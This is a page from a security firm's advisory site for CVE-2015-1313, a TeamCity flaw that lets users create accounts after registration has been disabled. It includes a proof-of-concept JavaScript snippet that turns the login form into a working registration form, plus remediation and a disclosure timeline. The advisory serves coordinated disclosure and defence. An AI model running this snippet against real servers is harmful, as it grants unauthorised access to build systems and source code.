@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <title>Beyond Binary - Advisory: TeamCity Account Creation</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        
+    <link rel="stylesheet" href="/css/style.css?7" />
+    <link rel="icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="shortcut" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="apple-touch-icon" type="iamge/png" href="https://beyondbinary.io/images/favicon.png" />
+    <link rel="canonical" href="https://beyondbinary.io/services/" />
+
+    <!--[if lt IE 9]>
+        <script src="/js/lib/html5shiv.js"></script>
+        <script src="/js/lib/ie8.js"></script>
+        <script src="/js/lib/respond.min.js"></script>
+    <![endif]-->
+</head>
+<body>
+<header>
+    <div class="container">
+        <div class="row">
+            <div class="table-row">
+                <div class="col-xs-4 col-sm-3 cell-xs">
+                    <a href="/">
+                        <img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" />
+                    </a>
+                </div>
+                <div class="col-xs-8 col-sm-9 cell-xs text-right position-static">
+                    <ul class="header-navigation">
+                        <li><a href="/">home</a></li>
+                        <li><a href="/about/">about</a></li>
+                        <li><a href="/services/">services</a></li>
+                        <li><a href="/articles/">articles</a></li>
+                        <li><a href="/contact/">contact</a></li>
+                        <li><a href="/media/">media</a></li>
+                    </ul>
+                    <svg id="menu-burger" width="64" height="64" viewBox="0 0 64 64" xmlns="http://www.w3.org/2000/svg">
+                        <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916789,20.818994 53.8166421,0"/>
+                        <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.1969746,31.909063 53.8166424,0"/>
+                        <path fill="none" stroke="#7b7b7b" stroke-width="3" stroke-linejoin="bevel" d="m 5.0916788,42.95698 53.8166422,0"/>
+                    </svg>
+                </div>
+            </div>
+        </div>
+    </div>
+    <img class="sticky-morph" src="/images/sticky-morph.png" srcset="/images/sticky-morph@2x.png 2x" alt="" />
+</header>
+
+<section>
+    <div class="container">
+        <h2 class="blue-line-through-md"><span>Advisories &amp; news&nbsp;</span></h2>
+        <div class="row">
+            <article class="col-md-7">
+                <header>
+                    <span class="date">March 1 2015</span>
+                    <h1>Advisory: TeamCity Account Creation</h1>
+                    <a class="tag" href="/tags/advisory/">Advisory</a>
+                    <a class="tag" href="/tags/cve/">CVE</a>
+                    <a class="tag" href="/tags/exploit/">Exploit</a>
+                    <a class="tag" href="/tags/teamcity/">TeamCity</a>
+                </header>
+
+                <h2>Overview</h2>
+
+                <p><a href="https://www.jetbrains.com/teamcity/">TeamCity</a> is a multi-platform <a href="https://en.wikipedia.org/wiki/Continuous_integration">continuous integration</a> and build server product created by <a href="https://www.jetbrains.com/">JetBrains</a>. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process.</p>
+
+                <p>TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.</p>
+
+                <p>TeamCity version 9.0.1 and earlier was found to be vulnerable to an account creation issue which allows unauthorised users to gain access to the server and potentially extract sensitive information, including source code. Depending on the configuration, new users may have permission to execute new builds of software projects and potentially hijack configuration parameters resulting in remote code execution.</p>
+
+                <h2>Vulnerability Details</h2>
+
+                <p>TeamCity gives administrators the ability to disable guest logins, and registration of new users via configuration settings. When the application is configured to allow users to register accounts, a link is made available on the login page that directs them to the sign-up page. From there, a new user can create an account in the system and is immediately logged in with their new account details. The registration form contains <code>Username</code>, <code>Password</code> and <code>Confirm Password</code> fields, each of which needs to be filled out prior to submission. When the user completes these fields and attempts to register, the specified values are not submitted in clear text. Instead, some in-browser cryptography is performed and the <code>Password</code> and <code>Confirm Password</code> fields are submitted as ciphertext. The keys that are used for this cryptographic process are available inside the browser.</p>
+
+                <p>When the administrator changes the configuration settings so as to deny new account creation, the login page of the application no longer displays a link to the registration page. If a user knows the registration URL  and they browse to it directly, the application returns a redirect response and the user is presented with the login page again. As far as the front-end is concerned, the registration functionality is disabled.</p>
+
+                <p>The issue is that user accounts can still be created, even when configured to disallow account creation. This is made possible because the function that handles user account registration at <code>/registerUserSubmit.html</code> is still available to users who know how to create a valid request. This page doesn't appear to respect the administrator's configuration setting.</p>
+
+                <p>Each TeamCity installation has its own cryptographic keys, and so it's not possible to apply a sign-up request from one server to another. However, given that all of the cryptographic keys required to sign in are present in the browser via the login page, it is trivial to construct a valid account creation request using those keys.</p>
+
+                <h2>Affected versions</h2>
+
+                <p>Four separate versions of the TeamCity software were tested, and all were vulnerable to the issue. Those versions were:</p>
+
+                <ul>
+                    <li>9.0.1</li>
+                    <li>8.0.3</li>
+                    <li>8.0.2</li>
+                    <li>8.0.1</li>
+                </ul>
+
+                <p>It is likely that all versions of TeamCity up to and including 9.0.1 are vulnerable.
+</p>
+
+                <h2>CVE Identifier</h2>
+
+                <p>This vulnerability was allocated <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1313">CVE-2015-1313</a> by MITRE.</p>
+
+                <h2>Exploitation</h2>
+
+                <p>In order to exploit this flaw, it is possible to use to the login page itself. A user can browse to the login page of a vulnerable installation, and be presented with the following:</p>
+
+                <p class="img-full-screen-sm"><img src="/images/bbsec002/01-login-page.png" alt="Default login page" /></p>
+
+                <p>At this point the cryptography functionality is made available. The following JavaScript snippet, when run, modifies the existing login form so that it becomes a functional registration form.</p>
+
+                <p><pre>
+var form = jQuery(
+'&lt;form class="loginForm" method="post" action="registerUserSubmit.html"&gt;' +
+'&lt;div id="errorMessage"&gt;&lt;/div&gt;&lt;table&gt;&lt;tr class="formField"&gt;&lt;th&gt;' +
+'&lt;label for="input_teamcityUsername"&gt;Username: &lt;span class="mandatoryAsterix" ' +
+'title="Mandatory field"&gt;*&lt;/span&gt;&lt;/label&gt;&lt;/th&gt;&lt;td&gt;&lt;input class="text" ' +
+'id="input_teamcityUsername" type="text" name="username1"/&gt;&lt;span class="error" ' +
+'id="errorUsername1" style="margin-left: 0;"&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="formField"&gt;' +
+'&lt;th&gt;&lt;label for="password1"&gt;Password: &lt;span class="mandatoryAsterix" title="Mandatory ' +
+'field"&gt;*&lt;/span&gt;&lt;/label&gt;&lt;/th&gt;&lt;td&gt;&lt;input class="text" id="password1" type="password" ' +
+'name="password1" maxlength="80"&gt;&lt;span class="error" id="errorPassword1" ' +
+'style="margin-left: 0;"&gt;&lt;/span&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr class="formField"&gt;&lt;th&gt;&lt;label ' +
+'for="retypedPassword"&gt;Confirm password: &lt;span class="mandatoryAsterix" ' +
+'title="Mandatory field"&gt;*&lt;/span&gt;&lt;/label&gt;&lt;/th&gt;&lt;td&gt;&lt;input class="text" ' +
+'id="retypedPassword" type="password" name="retypedPassword" maxlength="80"&gt;&lt;/td&gt;' +
+'&lt;/tr&gt;&lt;tr&gt;&lt;th&gt;&lt;i id="saving" style="display: none; " class="icon-refresh icon-spin ' +
+'progressRing progressRingSubmitBlock" title="Please wait..."&gt;&lt;/i&gt;&lt;/th&gt;' +
+'&lt;td&gt;&lt;input class="btn loginButton" type="submit" value="Register"/&gt;&lt;a ' +
+'class="loginButton" href="/login.html"&gt;Cancel&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;' + '&lt;/table&gt;' +
+'&lt;input type="hidden" id="submitCreateUser" name="submitCreateUser"/&gt;' +
+'&lt;input type="hidden" id="publicKey" name="publicKey" value=""/&gt;&lt;/form&gt;');
+
+form.find('#publicKey').attr('value', jQuery('form.loginForm').find('#publicKey').attr('value'));
+jQuery('.loginForm').unbind('submit').replaceWith(form);
+form.submit(function() {return BS.CreateUserForm.submitCreateUser();});
+
+BS.CreateUserForm=OO.extend(BS.AbstractPasswordForm,{submitCreateUser:function(){
+var a=this;BS.PasswordFormSaver.save(this,this.formElement().action,OO.extend(
+BS.ErrorsAwareListener,{onDuplicateAccountError:function(b){
+$("errorUsername1").innerHTML=b.firstChild.nodeValue;a.highlightErrorField(
+$("input_teamcityUsername"));},onEmptyUsernameError:function(b){
+$("errorUsername1").innerHTML=b.firstChild.nodeValue;a.highlightErrorField(
+$("input_teamcityUsername"));},onPasswordsMismatchError:function(b){
+$("errorPassword1").innerHTML=b.firstChild.nodeValue;a.highlightErrorField(
+$("password1"));a.highlightErrorField($("retypedPassword"));},
+onEmptyPasswordError:function(b){$("errorPassword1").innerHTML=b.firstChild.nodeValue;
+a.highlightErrorField($("password1"));},onMaxNumberOfUserAccountsReachedError:
+function(b){alert(b.firstChild.nodeValue);},onUserPropertyError:function(c){
+var e=c.firstChild.nodeValue.split(":",2);if(e.length&lt;2){return;}
+var d=$("error_"+e[0]);if(d!=null){d.innerHTML=e[1];var b=$("input_"+e[0]);
+if(b){a.highlightErrorField(b);}}},onCompleteSave:function(c,d,b){
+BS.ErrorsAwareListener.onCompleteSave(c,d,b);if(!b){BS.XMLResponse.processRedirect(d);}
+}}));return false;}});BS.AdminCreateUserForm=OO.extend(BS.CreateUserForm,{
+setSaving:function(a){if(a){BS.Util.show("saving1");}else{BS.Util.hide("saving1");
+}}});;
+                </pre></p>
+
+                <p>This JavaScript can be entered into the browser directly via the JavaScript console, as shown below:</p>
+
+                <p class="img-full-screen-sm"><img src="/images/bbsec002/02-js-console.png" alt="JavaScript insertion" /></p>
+
+                <p>Once executed the login form is then changed to a registration form with the appropriate submission events all wired-up correctly:</p>
+
+                <p class="img-full-screen-sm"><img src="/images/bbsec002/03-generated-reg-form.png" alt="Generated registration form" /></p>
+
+                <p>At this point this registration form functions exactly like the one that has been turned off by the administrator, and any requests made from this form will succeed in creating accounts on the server.</p>
+
+                <h2>Remediation</h2>
+
+                <p>Download and install <a href="https://www.jetbrains.com/teamcity/download/">TeamCity version 9.0.2</a> (<a href="https://confluence.jetbrains.com/display/TW/TeamCity+9.0.2+%28build+32195%29+Release+Notes">release notes</a>).</p>
+
+                <h2>Timeline</h2>
+
+                <ul>
+                    <li><strong>19th January 2015</strong>
+                        <ul>
+                          <li>Bug discovery and Proof of Concept exploit developed.</li>
+                          <li>Contacted vendor requesting PGP key for secure communications.</li>
+                          <li>Contacted MITRE requesting CVE identifier.</li>
+                        </ul>
+                    </li>
+                    <li><strong>20th January 2015</strong>
+                        <ul>
+                            <li>Versions 9.0.x and 8.1.x tested and found to be vulnerable.</li>
+                            <li>Secure contact with vendor established, vulnerability details disclosed.</li>
+                            <li>Vendor responded indicating issue is under investigation.</li>
+                        </ul>
+                    </li>
+                    <li><strong>23rd January 2015</strong>
+                        <ul>
+                          <li>MITRE responded, <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1313">CVE-2015-1313</a> allocated.</li>
+                          <li>Contacted vendor informing them of CVE identifer allocation.</li>
+                        </ul>
+                    </li>
+                    <li><strong>31st January 2015</strong>
+                        <ul>
+                          <li>Vendor released TeamCity version 9.0.2 which addresses the issue.</li>
+                        </ul>
+                    </li>
+                    <li><strong>04th February 2015</strong>
+                        <ul>
+                          <li>Public disclosure.</li>
+                        </ul>
+                    </li>
+                </ul>
+            </article>
+
+            <aside class="col-md-4 col-md-offset-1">
+                <h2 class="blue-line-through-md"><span>Recent&nbsp;</span></h2>
+                <article>
+                    <header>
+                        <span class="date">10 March 2015</span>
+                        <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce-response-analysis/">Opinion: Seagate's Analysis is Incorrect</a></h4>
+                    </header>
+                    <div class="small-text text-black">
+                        <p>On March 1st 2015 Beyond Binary went public with an advisory that disclosed 0day flaws in Seagate Business Storage 2-Bay NAS devices. Days later, Seagate responded to the advisory through a number of channels:</p>
+                        <ul>
+                            <li>A direct email to Beyond Binary</li>
+                        </ul>
+                    </div>
+                    <footer>
+                        <a class="tag" href="/tags/opinion/">Opinion</a>
+                        <a class="tag" href="/tags/seagate/">Seagate</a>
+                    </footer>
+                </article>
+
+                <article>
+                    <header>
+                        <span class="date">1 March 2015</span>
+                        <h4 class="text-header upper-case"><a href="/articles/seagate-nas-rce/">Advisory: Seagate NAS Remote Code Execution Vulnerability</a></h4>
+                    </header>
+                    <div class="small-text text-black">
+                        <p>Seagate is a well-known vendor of hardware solutions, with products available worldwide. Its line of NAS products targeted at businesses is called Business Storage 2-Bay NAS. These can be found inside home and business networks, and in many cases they are publicly exposed.</p>
+                    </div>
+                    <footer>
+                        <a class="tag" href="/tags/advisory/">Advisory</a>
+                        <a class="tag" href="/tags/cve/">CVE</a>
+                        <a class="tag" href="/tags/exploit/">Exploit</a>
+                        <a class="tag" href="/tags/seagate/">Seagate</a>
+                    </footer>
+                </article>
+
+                <article>
+                    <header>
+                        <span class="date">4 February 2015</span>
+                        <h4 class="text-header upper-case"><a href="/articles/teamcity-account-creation/">Advisory: TeamCity Account Creation</a></h4>
+                    </header>
+                    <div class="small-text text-black">
+                        <p>TeamCity is a multi-platform continuous integration and build server product created by JetBrains. It is used by many development organisations to automate the build and deployment of software solutions as part of the development process. TeamCity is a very popular product and hence the number of installations, both public and private, is quite high.</p>
+                    </div>
+                    <footer>
+                        <a class="tag" href="/tags/advisory/">Advisory</a>
+                        <a class="tag" href="/tags/cve/">CVE</a>
+                        <a class="tag" href="/tags/exploit/">Exploit</a>
+                        <a class="tag" href="/tags/teamcity/">TeamCity</a>
+                    </footer>
+                </article>
+
+                <p>
+                    <a href="/articles/" class="button full-width-xs">View older articles</a>
+                </p>
+            </aside>
+        </div>
+    </div>
+</section>
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="table-row">
+                <div class="cell-sm col-sm-2 text-center">
+                    <p>
+                        <a href="/"><img src="/images/beyond-binary-logo.png" srcset="/images/beyond-binary-logo@2x.png 2x" alt="" /></a>
+                    </p>
+                </div>
+
+                <div class="cell-sm col-sm-10">
+                    <div class="row">
+                        <div class="col-sm-11 col-sm-offset-1">
+                          <p><a href="https://twitter.com/BeyondBase2/status/620777646499041280">14 July 2015:&nbsp;</a>If you’re relying on product for your security, whether it be hardware or software, you need to re-evaluate your stance. <a href="https://twitter.com/hashtag/everythingisbroken?src=hash">#everythingisbroken</a></p>
+                            <hr />
+                            <ul class="footer-navigation">
+                                <li><a href="/">home</a></li>
+                                <li><a href="/about/">about</a></li>
+                                <li><a href="/services/">services</a></li>
+                                <li><a href="/articles/">articles</a></li>
+                                <li><a href="/contact/">contact</a></li>
+                                <li><a href="/media/">media</a></li>
+                            </ul>
+                            <p class="small-text">
+                                &copy; Beyond Binary Pty Ltd - ABN 74 147 311 972
+                            </p>
+                        </div>
+                    </div>
+                </div>   
+            </div>
+        </div>
+    </div>
+</footer>
+    
+<script src="/js/lib/jquery-1.11.3.min.js"></script>
+<script src="/js/lib/jquery-ui.min.js"></script>
+<script src="/js/lib/snap.svg-min.js"></script>
+<script src="/js/equal-height.js"></script>
+<script src="/js/menu-burger.js?3"></script>
+<script src="/js/hero/hero.js?9"></script>
+<script src="/js/hero/texts.js?9"></script>
+<script src="/js/hero/bar.js?9"></script>
+<script src="/js/hero/morph.js?9"></script>
+<script src="/js/notification.js"></script>
+<script src="/js/contact-form.js"></script>
+
+</body>
